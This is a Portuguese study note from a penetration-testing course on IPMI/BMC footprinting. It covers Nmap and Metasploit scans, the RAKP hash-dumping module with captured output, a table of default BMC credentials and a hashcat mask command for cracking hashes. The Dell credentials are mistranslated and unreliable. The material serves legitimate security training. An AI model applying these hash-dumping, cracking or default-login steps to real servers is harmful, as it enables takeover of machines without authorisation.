[[Redes - IPMI]]

## Footprinting the Service

- **Comunicação:** Utiliza a porta **623 UDP**.
- **Baseboard Management Controllers (BMCs):** São sistemas que implementam o protocolo IPMI, geralmente embarcados com processadores ARM e executando Linux. Eles se conectam diretamente à placa-mãe do host e podem estar integrados ou adicionados via PCI.
- **Servidores e BMCs:** A maioria dos servidores modernos vem com um BMC integrado ou suporta sua adição. Exemplos comuns incluem **HP iLO**, **Dell DRAC** e **Supermicro IPMI**.
- **Acesso e Controle:** Se um BMC for comprometido durante um teste de penetração, o invasor obtém controle total sobre a placa-mãe do host, permitindo monitorar, reinicializar, desligar ou reinstalar o sistema operacional. Isso equivale a ter acesso físico ao sistema.
- **Interfaces de Gerenciamento:** Muitos BMCs oferecem um console de gerenciamento baseado na web, protocolos de acesso remoto como **Telnet** ou **SSH**, além da porta **623 UDP** para o protocolo IPMI.
- **Exemplo de Uso:** Um script Nmap, como o `ipmi-version NSE`, pode ser usado para fazer o footprint de serviços IPMI.

## NMAP
```sh
NycolasES6@htb[/htb]$ sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local

Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-04 21:48 GMT
Nmap scan report for ilo.inlanfreight.local (172.16.2.2)
Host is up (0.00064s latency).

PORT    STATE SERVICE
623/udp open  asf-rmcp
| ipmi-version:
|   Version:
|     IPMI-2.0
|   UserAuth:
|   PassAuth: auth_user, non_null_user
|_  Level: 2.0
MAC Address: 14:03:DC:674:18:6A (Hewlett Packard Enterprise)

Nmap done: 1 IP address (1 host up) scanned in 0.46 seconds
```

Aqui, podemos ver que o protocolo IPMI está de fato escutando na porta 623, e o Nmap fez fingerprinting da versão 2.0 do protocolo. Também podemos usar o módulo do scanner Metasploit [IPMI Information Discovery (auxiliary/scanner/ipmi/ipmi_version)](https://www.rapid7.com/db/modules/auxiliary/scanner/ipmi/ipmi_version/) .

#### Verificação de versão do Metasploit
```sh
msf6 > use auxiliary/scanner/ipmi/ipmi_version 
msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_version) > show options 

Module options (auxiliary/scanner/ipmi/ipmi_version):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   BATCHSIZE  256              yes       The number of hosts to probe in each set
   RHOSTS     10.129.42.195    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      623              yes       The target port (UDP)
   THREADS    10               yes       The number of concurrent threads


msf6 auxiliary(scanner/ipmi/ipmi_version) > run

[*] Sending IPMI requests to 10.129.42.195->10.129.42.195 (1 hosts)
[+] 10.129.42.195:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0) 
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Algumas senhas padrão do IPMI exclusivas para manter em nossas folhas de dicas incluem:

|Produto|Nome de usuário|Senha|
|---|---|---|
|Dell iDRAC|raiz|Calvino|
|HP iLO|Administrador|sequência aleatória de 8 caracteres composta por números e letras maiúsculas|
|Supermicro IPMI|ADMIN|ADMIN|

Também é essencial testar senhas padrões conhecidas para QUALQUER serviço que descobrirmos, pois elas geralmente são deixadas inalteradas e podem levar a ganhos rápidos. Ao lidar com BMCs, essas senhas padrões podem nos dar acesso ao console da web ou até mesmo acesso à linha de comando via SSH ou Telnet.

## Configurações perigosas
Se as credenciais padrão não funcionarem para acessar um BMC, podemos recorrer a uma [falha](http://fish2.com/ipmi/remote-pw-cracking.html) no protocolo RAKP no IPMI 2.0. Durante o processo de autenticação, o servidor envia um hash SHA1 ou MD5 com sal da senha do usuário para o cliente antes que a autenticação ocorra. Isso pode ser aproveitado para obter o hash da senha para QUALQUER conta de usuário válida no BMC.

Esses hashes de senha podem ser quebrados offline usando um ataque de dicionário usando o `Hashcat`modo `7300`. No caso de um HP iLO usar uma senha padrão de fábrica, podemos usar este comando de ataque de máscara Hashcat `hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u`que tenta todas as combinações de letras maiúsculas e números para uma senha de oito caracteres.

Para recuperar hashes IPMI, podemos usar o módulo Metasploit [IPMI 2.0 RAKP Remote SHA1 Password Hash Retrieval .](https://www.rapid7.com/db/modules/auxiliary/scanner/ipmi/ipmi_dumphashes/)

#### Metasploit Dumping Hashes
```sh
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes 
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show options 

Module options (auxiliary/scanner/ipmi/ipmi_dumphashes):

   Name                 Current Setting                                                    Required  Description
   ----                 ---------------                                                    --------  -----------
   CRACK_COMMON         true                                                               yes       Automatically crack common passwords as they are obtained
   OUTPUT_HASHCAT_FILE                                                                     no        Save captured password hashes in hashcat format
   OUTPUT_JOHN_FILE                                                                        no        Save captured password hashes in john the ripper format
   PASS_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt  yes       File containing common passwords for offline cracking, one per line
   RHOSTS               10.129.42.195                                                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                623                                                                yes       The target port
   THREADS              1                                                                  yes       The number of concurrent threads (max one per host)
   USER_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt      yes       File containing usernames, one per line



msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run

[+] 10.129.42.195:623 - IPMI - Hash found: ADMIN:8e160d4802040000205ee9253b6b8dac3052c837e23faa631260719fce740d45c3139a7dd4317b9ea123456789abcdefa123456789abcdef140541444d494e:a3e82878a09daa8ae3e6c22f9080f8337fe0ed7e
[+] 10.129.42.195:623 - IPMI - Hash for user 'ADMIN' matches password 'ADMIN'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Aqui podemos ver que obtivemos com sucesso o hash da senha para o usuário `ADMIN`, e a ferramenta foi capaz de quebrá-lo rapidamente para revelar o que parece ser uma senha padrão `ADMIN`. A partir daqui, poderíamos tentar fazer login no BMC ou, se a senha fosse algo mais exclusivo, verificar a reutilização da senha em outros sistemas.

A verificação do IPMI deve fazer parte do nosso manual de teste de penetração interna para qualquer ambiente que estejamos avaliando.

---
## Referências

https://academy.hackthebox.com/module/112/section/1245